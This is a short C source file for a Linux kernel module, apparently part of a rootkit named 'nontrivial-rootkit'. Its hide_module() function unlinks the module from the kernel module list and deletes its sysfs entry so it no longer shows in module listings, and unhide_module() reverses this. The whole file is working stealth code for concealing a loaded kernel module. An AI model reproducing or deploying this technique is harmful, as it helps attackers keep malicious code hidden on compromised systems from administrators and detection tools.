#include <linux/module.h>
#include <linux/kernel.h>
#include <modhide.h>
int isHidden = 0;
struct list_head * list_head_saved;
struct kobject *kobj_saved;
struct list_head *mod_prev;
void hide_module(void){
	if (isHidden) return;
	list_head_saved = THIS_MODULE->list.prev;
	kobj_saved = THIS_MODULE->mkobj.kobj.parent;

	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);

	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;

	isHidden =1;
}
void unhide_module(void){
	if (!isHidden) return;
	list_add(&THIS_MODULE->list, list_head_saved);
	kobject_add(&THIS_MODULE->mkobj.kobj, kobj_saved, "nontrivial-rootkit");
	isHidden = 0;
}
